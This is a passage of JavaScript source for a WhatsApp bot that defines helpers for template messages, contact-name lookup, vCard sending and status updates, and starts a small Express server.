      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send("GARFIELD-WHATSAPP-BOT-v10 STARTED ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
